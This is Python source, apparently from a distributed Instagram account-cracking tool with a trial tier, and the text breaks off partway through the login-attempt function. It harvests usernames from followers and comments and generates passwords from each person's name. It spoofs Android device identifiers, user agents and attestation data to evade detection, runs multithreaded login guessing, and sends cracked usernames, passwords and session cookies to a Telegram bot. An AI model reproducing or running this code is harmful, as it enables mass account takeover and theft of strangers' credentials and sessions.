import requests, json, re, uuid, time, random, datetime, pytz, os, string, threading
from concurrent.futures import ThreadPoolExecutor

from .kynaa import Kyanaraaa
from yxdfb.Module import Tod
from bluid.getd import Yntks
from bluid.logo import Logo
from bluid.data import UserAgent

H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
N = '\x1b[0m'     # WARNA MATI
R = "\x1b[0;31m" # Merah

def generate_webview_user_agent():
    android_versions = ['6.0', '7.0', '8.0', '9', '10', '11', '12']
    chrome_versions = [f"{major}.0.{random.randint(3000, 4500)}.{random.randint(50, 500)}" for major in range(60, 120)]
    dpi_values = [320, 380, 400, 440, 480]
    resolutions = ['1080x1920', '720x1280', '1440x2560', '1080x2340']
    brands = [
        {'brand': 'OnePlus', 'model': 'ONEPLUS A3010', 'device': 'OnePlus3T', 'manufacturer': 'qcom'},
        {'brand': 'Samsung', 'model': 'SM-G975F', 'device': 'beyond2', 'manufacturer': 'samsung'},
        {'brand': 'Huawei', 'model': 'P30', 'device': 'ELE-L29', 'manufacturer': 'huawei'},
        {'brand': 'Xiaomi', 'model': 'Redmi Note 10', 'device': 'sunny', 'manufacturer': 'xiaomi'}
    ]
    locales = ['en_US', 'en_GB', 'fr_FR', 'es_ES']
    session_id = random.randint(100000000, 999999999)

    # Pick randoms
    android_version = random.choice(android_versions)
    chrome_version = random.choice(chrome_versions)
    dpi = random.choice(dpi_values)
    resolution = random.choice(resolutions)
    device = random.choice(brands)
    inst_ver = f"{random.randint(70, 100)}.{random.randint(0, 9)}.{random.randint(0, 99)}.{random.randint(0, 999)}"
    sdk = random.randint(23, 34)
    build = f"{random.choice(['GUG11R', 'RP1A', 'TP1A'])}"
    locale = random.choice(locales)

    return (
        f"Mozilla/5.0 (Linux; Android {android_version}; {device['model']} Build/{build}; wv) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 "
        f"Chrome/{chrome_version} Mobile Safari/537.36 "
        f"Instagram {inst_ver} Android ({sdk}/{android_version}; {dpi}dpi; {resolution}; "
        f"{device['brand']}; {device['model']}; {device['device']}; {device['manufacturer']}; {locale}; {session_id})"
    )

# Assign to a variable
uagenttt2 = generate_webview_user_agent()

class IGUserAgentGenerator:
    def __init__(self):
        pass

    def generate(self):
        instagram_versions = [
            "370.0.0.52.592", "379.0.0.32.112", "378.0.0.38.119", "377.0.0.30.121", "370.0.0.12.142", "379.0.0.32.112", "378.0.0.38.119", "377.0.0.30.121"
        ]
        android_versions = ["28/9", "29/10", "30/11", "31/12", "32/13"]
        dpis = [240, 320, 480, 640, 239]
        resolutions = ["720x1280", "1080x1920", "1440x2560", "1080x2340"]
        manufacturers = ["samsung", "google", "xiaomi", "huawei", "oppo"]
        devices = {
            "samsung": ["SM-G960F", "SM-G973F", "SM-A505F"],
            "google": ["Pixel 2", "G011A"],
            "xiaomi": ["Redmi Note 7", "Mi A2"],
            "huawei": ["P20 Lite", "P30"],
            "oppo": ["CPH1909", "A9 2020"]
        }
        cpu_archs = ["arm64-v8a", "armeabi-v7a", "x86", "intel"]
        locales = ["en_US", "en_GB", "en_NG", "id_ID", "fr_FR"]

        insta_version = random.choice(instagram_versions)
        android_ver = random.choice(android_versions)
        dpi = f"{random.choice(dpis)}dpi"
        resolution = random.choice(resolutions)
        manufacturer = random.choice(manufacturers)
        device_model = random.choice(devices[manufacturer])
        cpu = random.choice(cpu_archs)
        locale = random.choice(locales)
        version_code = str(random.randint(500000000, 699999999))

        return f"Instagram {insta_version} Android ({android_ver}; {dpi}; {resolution}; {manufacturer}; {device_model}; {device_model}; {cpu}; {locale}; {version_code})"

class UserAgentGenerator:
    def __init__(self):
        pass

    def get_random_user_agent(self):
        generators = [
            self.ua_samsung,
            self.ua_realme,
            self.ua_windows,
            self.ua_nexus
        ]
        return random.choice(generators)()

    def ua_samsung(self):
        try:
            a = random.choice(['Build/QP1A','Build/RP1A','Build/TP1A','Build/PPR1','Build/SP1A','Build/PPR1'])
        except FileNotFoundError:
            a = "Build/QP1A"
        b = random.choice(['SM-M022G','SM-M115F','SM-M105G','SM-M336B','SM-A013M','SM-N981U','SM-9005','SM-A260F',
                           'SM-A102U1','SM-A045F','SGH-I317M','SM-G973F','SM-A516U','SM-G6200','SM-S908U','SM-S908E',
                           'SM-S908B','SM-G900F','SM-S908U1','SM-M215G','SM-G973U','SM-G973W','SM-G973U1','SM-G9730',
                           'SM-G973N','SM-G973X','SM-A736B','SM-A013F','SM-S916U','SM-S916B','SM-G870D'])
        return f'Mozilla/5.0 (Linux; Android {random.randint(6,12)}; {a} {b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/{float(random.randint(1,12))} Chrome/{random.randint(111,999)}.0.{random.randint(1111,9999)}.{random.randint(11,99)} Mobile Safari/537.36'

    def ua_realme(self):
        xix = random.choice(["RMX3363","RMX3241","RMX3081","RMX3363","RMX3201","RMX1851"])
        xzx = ''.join(random.choices('ABCDEFGHIJKLM1234567890NOPQRSTUVWXYS', k=6))
        return f"Mozilla/5.0 (Linux; Android {random.randint(4,12)}; REALME {xix} Build/{xzx}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(50,70)}.0.{random.randint(3000,4000)}.{random.randint(80,120)} Mobile Safari/537.36"

    def ua_windows(self):
        a = random.choice(['10.0','11.0'])
        b = random.choice(['Win64; x64','Win32; x32'])
        return f'Mozilla/5.0 (Windows NT {a}; {b}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(111,999)}.0.{random.randint(0,9)}.{random.randint(0,9)} Safari/537.36'

    def ua_nexus(self):
        a = random.choice(['Build/MRA58N','Build/MOB30X','Build/FRF91','Build/GRK39F','Build/ERD62','Build/LMY48T','Build/KOT49H','Build/LMY48I','Build/JOP40D','Build/KRT16S','Build/JWR66Y','Build/JOP40C','Build/JDQ39'])
        b = random.choice(['Nexus 4','Nexus 5','Nexus 5P','Nexus One','Nexus 6P','Nexus 7','Nexus 5X','Nexus 10'])
        return f'Mozilla/5.0 (Linux; Android {random.randint(6,13)}; {b} {a}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(111,999)}.0.{random.randint(1111,9999)}.{random.randint(11,99)} Mobile Safari/537.36'
##AJAX WINDOWS USERAGENT####      
def random_windows_useragent():  
    win_version = random.choice(['10.0', '11.0'])  
    arch = random.choice(['Win64; x64', 'Win32; x32'])  
    chrome_major = random.randint(111, 123)  
    chrome_build = f"{chrome_major}.0.{random.randint(1000,9999)}.{random.randint(0,99)}"  
    return f"Mozilla/5.0 (Windows NT {win_version}; {arch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_build} Safari/537.36"  
uas = random_windows_useragent()  
print(uas)
        
class Dump:

    def __init__(self, lim, asw, cok):
        self.uid_user = []
        self.dumpdata = []
        self.ok, self.cp, self.lop = 0, 0, 0
        self.cokie, self.lim, self.asw = cok, lim, asw
        self.config_login = {'mid': [], 'attp': []}
        self.telegram_message_id = None  # Store message ID for progress updates
        self.token = None
        self.chat_id = None
        self.lock = threading.Lock()  # Thread lock for telegram_message_id
        self.log_file = "debug.log"
        self.load_telegram_credentials()  # Load Telegram credentials

    def load_telegram_credentials(self):
        """Load Telegram bot token and chat ID from files."""
        token_file = "Bot-token.txt"
        chat_id_file = "Bot-ID.txt"

        if os.path.exists(token_file):
            try:
                with open(token_file, "r") as f:
                    self.token = f.read().strip()
                if not self.token:
                    with open(self.log_file, "a") as f:
                        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - [ERROR] {token_file} is empty\n")
            except IOError as e:
                self.token = None
                with open(self.log_file, "a") as f:
                    f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - [ERROR] Failed to read {token_file}: {e}\n")
        else:
            with open(self.log_file, "a") as f:
                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - [ERROR] {token_file} not found\n")

        if os.path.exists(chat_id_file):
            try:
                with open(chat_id_file, "r") as f:
                    self.chat_id = f.read().strip()
                if not self.chat_id:
                    with open(self.log_file, "a") as f:
                        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - [ERROR] {chat_id_file} is empty\n")
            except IOError as e:
                self.chat_id = None
                with open(self.log_file, "a") as f:
                    f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - [ERROR] Failed to read {chat_id_file}: {e}\n")
        else:
            with open(self.log_file, "a") as f:
                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - [ERROR] {chat_id_file} not found\n")

    """
    def send_telegram_progress(self, user, kyna):
        ""Send or update Telegram message with live progress count.""
        if not self.token or not self.chat_id:
            with open(self.log_file, "a") as f:
                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - [ERROR] Skipping Telegram progress: token={bool(self.token)}, chat_id={bool(self.chat_id)}\n")
            return

        live_check = f"{self.lop}/{len(self.dumpdata)}"
        message = (
            f"‹ LIVE HACK WIDGET\n. — — — — —  — — — — — . \n"
            f"‹ ɢᴏᴏᴅ : {self.ok}\n"
            f"‹ ʙᴀᴅ : {self.cp}\n"
            f"‹ method: [INSTAGRAM]\n"
            f". — — — — —  — — — — — . \n"
            f"• Whatsapp: +2349035850097"
        )

        with self.lock:
            for attempt in range(3):
                try:
                    if self.telegram_message_id is None:
                        response = requests.get(
                            f"https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.chat_id}&text={requests.utils.quote(message)}",
                            headers={'User-Agent': uas},
                            timeout=10
                        )
                        response.raise_for_status()
                        message_data = response.json()
                        if message_data.get("ok"):
                            self.telegram_message_id = message_data['result']['message_id']
                            with open(self.log_file, "a") as f:
                                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - [INFO] Thread {threading.get_ident()}: Sent Telegram message, ID: {self.telegram_message_id}\n")
                            return
                        else:
                            with open(self.log_file, "a") as f:
                                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - [ERROR] Thread {threading.get_ident()}: Telegram sendMessage failed: {message_data}\n")
                    else:
                        response = requests.get(
                            f"https://api.telegram.org/bot{self.token}/editMessageText?chat_id={self.chat_id}&message_id={self.telegram_message_id}&text={requests.utils.quote(message)}",
                            headers={'User-Agent': uas},
                            timeout=10
                        )
                        response.raise_for_status()
                        with open(self.log_file, "a") as f:
                            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - [INFO] Thread {threading.get_ident()}: Updated Telegram message ID: {self.telegram_message_id}\n")
                        return
                except (requests.exceptions.RequestException, json.JSONDecodeError) as e:
                    with open(self.log_file, "a") as f:
                        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - [ERROR] Thread {threading.get_ident()}: Telegram progress attempt {attempt+1} failed: {e}\n")
                    time.sleep(2)
                with open(self.log_file, "a") as f:
                    f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - [ERROR] Thread {threading.get_ident()}: All Telegram progress attempts failed for user: {user}\n")
    """

    def send_telegram_result(self, result_type, user, pw, followers, following, cookie=None):
        """Send Telegram notification for OK or CP results."""
        if not self.token or not self.chat_id:
            with open(self.log_file, "a") as f:
                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - [ERROR] Skipping Telegram result: token={bool(self.token)}, chat_id={bool(self.chat_id)}\n")
            return

        if result_type == "OK":
            message = (
                 f"‹ Login OK ✓\n. — — — — —  — — — — — . \n"
                f"‹ Username: {user}\n"
                f"‹ Password: {pw}\n"
                f"‹ Followers: {followers}\n"
                f"‹ Following: {following}\n"
                f"‹ Cookie: {cookie}\n"
                f". — — — — —  — — — — — . \n"
                f"• Whatsapp: +2349035850097"
                f". — — — — —  — — — — — . \n"
            )
        else:  # CP
            message = (
                f"‹ Login CP 🔐\n. — — — — —  — — — — — . \n"
                f"‹ Username: {user}\n"
                f"‹ Password: {pw}\n"
                f"‹ Followers: {followers}\n"
                f"‹ Following: {following}\n"
                f"• Whatsapp: +2349035850097"
                f". — — — — —  — — — — — . \n"
            )

        for attempt in range(3):
            try:
                response = requests.get(
                    f"https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.chat_id}&text={requests.utils.quote(message)}",
                    headers={'User-Agent': uas},
                    timeout=10
                )
                response.raise_for_status()
                with open(self.log_file, "a") as f:
                    f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - [INFO] Thread {threading.get_ident()}: Sent Telegram result for {user} ({result_type})\n")
                return
            except (requests.exceptions.RequestException, json.JSONDecodeError) as e:
                with open(self.log_file, "a") as f:
                    f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - [ERROR] Thread {threading.get_ident()}: Telegram result attempt {attempt+1} failed for {user} ({result_type}): {e}\n")
                time.sleep(2)
        with open(self.log_file, "a") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - [ERROR] Thread {threading.get_ident()}: All Telegram result attempts failed for {user} ({result_type})\n")

    def apcb(self, username):
        ua_gen = IGUserAgentGenerator()
        rand_uaig = ua_gen.generate()
        with requests.Session() as ses:
            try:
                ses.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7', 'cache-control': 'max-age=0', 'cookie': self.cokie, 'dpr': '1', 'priority': 'u=0, i', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.99", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"15.0.0"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': rand_uaig, 'viewport-width': '673'
                })
                awok = ses.get(f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}").json()['data']['user']['id']
                return awok
            except:
                return None

    def media_id(self, posts_url):
        with requests.Session() as ses:
            try:
                ses.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9,id;q=0.8', 'cache-control': 'max-age=0', 'cookie':self.cokie, 'dpr': '1', 'priority': 'u=0, i', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"', 
                    'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6834.159", "Google Chrome";v="132.0.6834.159"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Linux"', 'sec-ch-ua-platform-version': '"6.8.0"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36', 'viewport-width': '1105',
                })
                cccp = ses.get(posts_url).text
                ussr = re.search('{"media_id":"(.*?)"',str(cccp)).group(1)
                return ussr
            except AttributeError:
                return None

    def kyna(self, userid, next_pae, kynaa, apcb, trial):
        if len(self.dumpdata) >= trial:
            return
        with requests.Session() as ses:
            try:
                ua_gen = UserAgentGenerator()
                rand_ua = ua_gen.get_random_user_agent()
                ses.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7', 'cookie': self.cokie, 'dpr': '1', 'priority': 'u=0, i', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"', 'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.99", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"', 'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"15.0.0"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': rand_ua, 'viewport-width': '673'
                })
                data = {"query_hash": apcb, "variables": json.dumps({"id": userid, "first": 150, "after": next_pae})}
                myid = ses.get('https://www.instagram.com/graphql/query/', params=data).json()
                for ussr in myid['data']['user'][f'{kynaa}']['edges']:
                    if len(self.dumpdata) >= trial:
                        break

                    cccp = ussr['node']['username']+'|'+ussr['node']['full_name'].replace('|','')
                    self.dumpdata.append(cccp)
                    print(f"\r[+] Taking ({H}{len(self.dumpdata)}{N}) Username. (Press Ctrl+C to Stop)", end="", flush=True)
                
                if len(self.dumpdata) >= trial:
                    return

                if myid['data']['user'][f'{kynaa}']['page_info']['has_next_page'] == True:
                    self.kyna(userid, 
                              myid['data']['user'][kynaa]['page_info']['end_cursor'], 
                              kynaa, 
                              apcb, 
                              trial)
            except:
                return

    def komentar(self, media_id, min_cursor, trial):
        ua_gen = IGUserAgentGenerator()
        rand_uaig = ua_gen.generate()
        if len(self.dumpdata) >= trial:
            return
        with requests.Session() as ses:
            try:
                ses.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7', 'cache-control': 'max-age=0', 'cookie': self.cokie, 'dpr': '1', 'priority': 'u=0, i', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"', 'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.99", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"', 'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"15.0.0"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': rand_uaig, 'viewport-width': '1358',
                })
                ussr = ses.get(f'https://www.instagram.com/api/v1/media/{media_id}/comments/?can_support_threading=true&permalink_enabled=false&min_id={min_cursor}').json()
                for usr in ussr['comments']:
                    if len(self.dumpdata) >= trial:
                        break

                    dat = usr['user']['username'] +'|'+ usr['user']['full_name']
                    if dat not in self.dumpdata:
                        self.dumpdata.append(dat)
                    print("============================================================")
                    print(f"\r[+] Collecting ({H}{len(self.dumpdata)}{N}) Username. (Ctrl+C untuk berhenti)", end="", flush=True)
                    print("============================================================")
                
                if len(self.dumpdata) >= trial:
                    return

                apc = ussr['next_min_id']
                self.komentar(media_id, apc, trial)
            except:
                return

    def balik(self):
        print(f"\n[{R}!{N}] Failed to Dump Username.\n")
        while True:
            retry = input(f"[{H}?{N}] try again (y/n): ").strip().lower()
            if retry == 'y':
                return
            elif retry == 'n':
                print("! exit the program.")
            else:
                print(f"\n[{R}!{N}] y/n block")
                continue

    def anakanjingkons(self, asw, asz):
        if "Trial" in self.lim:
            print(f"\n[{R}!{N}] you are a trial user, You can only dump 1K usernames.")
            cccp = input(f"[{H}>{N}] Enter Username: ").split(",")
            print()
            for ussr in cccp:
                uid = self.apcb(ussr)
                if uid:
                    self.uid_user.append(uid)
            if len(self.uid_user) == 0:
                self.balik()
            for userid in self.uid_user:
                self.kyna(userid, "", asz, asw, 1000)
                
            if not self.dumpdata:
                self.balik()
            else:
                print("")
                print("============================================================")
                print(f"[{H}✓{N}] Successfully Collected ({H}{len(self.dumpdata)}{N}) Usernames.")
                print("============================================================")
                self.kombinasi_pw()
        else:
            print("")
            print("============================================================")
            cccp = input(f"[{H}>{N}] Enter Username: ").split(",")
            print()
            for ussr in cccp:
                uid = self.apcb(ussr)
                if uid:
                    self.uid_user.append(uid)
            if len(self.uid_user) == 0:
                self.balik()
            for userid in self.uid_user:
                self.kyna(userid, "", asz, asw, 100000000000000000000000)

            if not self.dumpdata:
                self.balik()
            else:
                print("")
                print("============================================================")
                print(f"[{H}✓{N}] managed to take ({H}{len(self.dumpdata)}{N}) username.")
                print("============================================================")
                self.kombinasi_pw()

    def dump_koomentar(self):
        if "Trial" in self.lim:
            print(f"\n[{R}!{N}] you are a trial user, you can only dump 1K usernames.")
            cccp = input(f"\n[{H}>{N}] enter link: ")
            ussr = self.media_id(cccp)
            if ussr == None:
                return
            self.komentar(ussr, '', 1000)

            if not self.dumpdata:
                self.balik()
            else:
                print("")
                print("============================================================")
                print(f"[{H}✓{N}] managed to take ({H}{len(self.dumpdata)}{N}) username.")
                print("============================================================")
                self.kombinasi_pw()
        else:
            print(f"\n[{H}*{N}] please enter the Instagram post URL.")
            cccp = input(f"\n[{H}>{N}] enter link: ")
            ussr = self.media_id(cccp)
            if ussr == None:
                return
            self.komentar(ussr, '', 1000000000000000000)

            if not self.dumpdata:
                self.balik()
            else:
                print("")
                print("============================================================")
                print(f"[{H}✓{N}] managed to take ({H}{len(self.dumpdata)}{N}) username.")
                print("============================================================")
                self.kombinasi_pw()

    def UserAgent(self):
        while True:
            print(f"\n[{H}1{N}] Dump UserAgent\n[{H}2{N}] Delete Useragent\n[{R}3{N}] back to menu")
            fil = input("> ")
            if fil in ["1", "01"]:
                Yntks(self.asw, "data/cache/.sett_UaIG").pilihan()
            elif fil in ["2", "02"]:
                try:
                    os.remove("data/cache/.sett_UaIG.json")
                except:
                    pass
                print(f"\n[{H}✓{N}] successfully deleted instagram UserAgent")
                time.sleep(2)
                self.UserAgent()
            elif fil in ["3", "03"]:
                return
            else:
                print("! Choose The Right One")
                time.sleep(1)
                self.UserAgent()

    def timezone_offset(self):
        try:
            tim = datetime.datetime.now(pytz.timezone('Africa/Lagos'))
            ofs = tim.utcoffset().total_seconds() / 3600
            return str(ofs)
        except:
            return str(-time.timezone / 3600)

    def get_headers(self, barcelona=False):
        rawClient = str(int(time.time()))
        android_id = 'android-' + ''.join(random.choices('0123456789abcdef', k=16))
        device_id = str(uuid.uuid4())
        family_device_id = str(uuid.uuid4())
        bloks = 'c0540eb85d97f640e878730536aaa77395f8948a761b2ae64a259208df42a306' if barcelona else 'ee55d61628b17424a72248a17431be7303200a6e7fa08b0de1736f393f1017bd'
        return {
            'x-ig-app-locale': 'en_NG',
            'x-ig-device-locale': 'en_NG',
            'x-ig-mapped-locale': 'en-NG, en-US',
            'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
            'x-pigeon-rawclienttime': f'{rawClient}.503',
            'x-ig-bandwidth-speed-kbps': '-1.000',
            'x-ig-bandwidth-totalbytes-b': '0',
            'x-ig-bandwidth-totaltime-ms': '0',
            'x-bloks-version-id': bloks,
            'x-ig-www-claim': '0',
            'x-bloks-prism-button-version': 'CONTROL',
            'x-bloks-prism-indigo-link-version': '0',
            'x-bloks-prism-colors-enabled': 'false',
            'x-bloks-prism-ax-base-colors-enabled': 'false',
            'x-bloks-prism-font-enabled': 'false',
            'x-ig-attest-params': '{"attestation":[{"version":2,"type":"keystore","errors":[-1013],"challenge_nonce":"%s","signed_nonce":"","key_hash":""}]}' % (random.choice(self.config_login['attp'])),
            'x-bloks-is-layout-rtl': 'false',
            'x-ig-device-id': device_id,
            'x-ig-family-device-id': family_device_id,
            'x-ig-android-id': android_id,
            'x-ig-timezone-offset': self.timezone_offset(),
            'x-ig-nav-chain': f'com.bloks.www.caa.login.home_template:com.bloks.www.caa.login.home_template:1:button:{rawClient}.356::',
            'x-ig-client-endpoint': 'com.bloks.www.caa.login.home_template',
            'x-fb-connection-type': 'WIFI',
            'x-ig-connection-type': 'WIFI',
            'x-ig-capabilities': '3brTv10=',
            'x-ig-app-id': '3419628305025917' if barcelona else '567067343352427',
            'priority': 'u=3',
            'user-agent': str(UserAgent().ua_instagram(barcelona).replace("Instagram", "Barcelona")) if barcelona else str(UserAgent().ua_instagram(barcelona)),
            'accept-language': 'id-ID, en-US, id_ID, in_ID, en_NG, en-NG',
            'x-mid': random.choice(self.config_login['mid']),
            'ig-intended-user-id': '0',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'accept-encoding': 'gzip, deflate, br',
            'x-fb-http-engine': 'Liger',
            'x-fb-client-ip': 'True',
            'x-fb-server-cluster': 'True',
        }

    def instagram_attestation(self):
        for _ in range(2):
            try:
                tete = 'app_scoped_device_id={}&key_hash=a7061a8c87792ea1a16093d8561b50d164af65bb2649018fd5d730f6d938d89b'.format(str(uuid.uuid1()))
                android_id = 'android-' + ''.join(random.choices('0123456789abcdef', k=16))
                device_id = str(uuid.uuid4())
                family_device_id = str(uuid.uuid4())
                head = {
                    'priority': 'u=3', 'user-agent': str(UserAgent().ua_instagram("")), 'x-ig-app-locale': 'en_NG', 'x-ig-device-locale': 'en_NG', 'x-ig-mapped-locale': 'en_NG', 'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                    'x-ig-bandwidth-speed-kbps': '-1.000', 'x-ig-bandwidth-totalbytes-b': '0', 'x-ig-bandwidth-totaltime-ms': '0', 'x-bloks-version-id': 'c0540eb85d97f640e878730536aaa77395f8948a761b2ae64a259208df42a306', 'x-ig-www-claim': '0', 'x-bloks-prism-button-version': 'CONTROL', 'x-bloks-prism-indigo-link-version': '0', 'x-ig-app-id': '3419628305025917', 'x-bloks-prism-colors-enabled': 'false', 'x-bloks-prism-ax-base-colors-enabled': 'false', 'x-bloks-prism-font-enabled': 'false', 'x-ig-attest-params': '{"attestation":[{"version":2,"type":"keystore","errors":[-1013],"challenge_nonce":"","signed_nonce":"","key_hash":""}]}', 'x-bloks-is-layout-rtl': 'false', 'x-ig-device-id': device_id, 'x-ig-family-device-id': family_device_id, 'ig-intended-user-id': '0', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'accept-encoding': 'gzip, deflate, br', 'x-fb-http-engine': 'Liger', 'x-fb-client-ip': 'True', 'x-fb-server-cluster': 'True',
                }
                head.update({
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-1',
                    'x-pigeon-rawclienttime': str(time.time())[:14],
                    'x-ig-android-id': 'android-{}'.format(str(uuid.uuid4().hex)[:16]),
                })
                attp = requests.post('https://i.instagram.com/api/v1/attestation/create_android_keystore/', data=tete, headers=head)
                try:
                    mecanizeid = attp.headers['ig-set-x-mid']
                except:
                    mecanizeid = re.findall('mid=(.*?);', str(attp.headers))[0]
                changleNonce = attp.json()['challenge_nonce']
                self.config_login['mid'].append(mecanizeid)
                self.config_login['attp'].append(changleNonce)
            except Exception as e:
                print(e)
                continue

    def kombinasi_pw(self):
        self.instagram_attestation()
        print("============================================================")
        print(f"\n[{H}>{N}] Enter Additional Password\n[{H}>{N}] example: qwerty,123456")
        pw_tambahan = input("\n[?] Additional Password (Optional): ").split(",")
        print("============================================================")

        user_agent_status = "UserAgent is set" if os.path.exists("data/cache/.sett_UaIG.json") else "Script default UserAgent"
        print("============================================================")
        print(f"[{H}#{N}] You Are Currently Using {H}{user_agent_status}{N}")
        print("-" * 39 + f"\n[{H}+{N}] Crack Process Is Starting.\n" + "-" * 39 + "\n")
        os.system("clear")
        Logo("insta")
        print("============================================================")
        # Send initial Telegram progress message
        # if self.token and self.chat_id:
        #     self.send_telegram_progress("Initializing...", "Starting")
        with ThreadPoolExecutor(max_workers=30) as executor:
            for user in self.dumpdata:
                try:
                    uid, nama = user.split('|')
                    nama = nama.lower().strip()
                except ValueError:
                    continue
                passwords = Kyanaraaa(self.asw).generate_passwords(nama, pw_tambahan)
                executor.submit(self.crack, uid, passwords)

        exit(f"\n\n[>] Crack Process Has Been Completed")

    def print_proses(self, code):
        if code == 200:
            kyna = f"{H}200{N}"
        elif code == 400:
            kyna = f"{R}400{N}"
        elif code == 401:
            kyna = f"{R}401{N}"
        elif code == 403:
            kyna = f"{R}403{N}"
        elif code == 404:
            kyna = f"{R}404{N}"
        elif code == 429:
            kyna = f"{R}429{N}"
        elif code == 500:
            kyna = f"{R}500{N}"
        else:
            kyna = f"{R}{code}{N}"

        print(f"\r[{H}•{N}] [{kyna}] {str(self.lop)}/{len(self.dumpdata)} OK-:{H}{self.ok}{N} CP-:{R}{self.cp}{N}  ", end="")
        return kyna  # Return kyna for use in send_telegram_progress

    def crack(self, user, pasw):
        ses = requests.Session()
        kyna = None
        for pw in pasw:
            try:
                smartCONFIG = {
                    'android_id': 'android-{}'.format(Kyanaraaa(self.asw).Android_ID(user,pw)[:16]),
                    'family': str(uuid.uuid4()),
                    'device': str(uuid.uuid4()),
                    'wartefall': str(uuid.uuid4()),
                    'request_ts': str(time.time()),
                    'ps': str(uuid.uuid4())
                }
                smartheaders = self.get_headers(False)
                user_agenttt = UserAgent().ua_instagram("")
                smartheaders.update({
                    'x-pigeon-rawclienttime': smartCONFIG['request_ts'][:14],
                    'x-ig-bandwidth-speed-kbps': str(random.randint(5000, 20000)),
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(100000, 1000000)),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(500, 2000)),
                    'x-ig-device-id': smartCONFIG['device'],
                    'x-ig-family-device-id': smartCONFIG['family'],
                    'x-ig-android-id': smartCONFIG['android_id'],
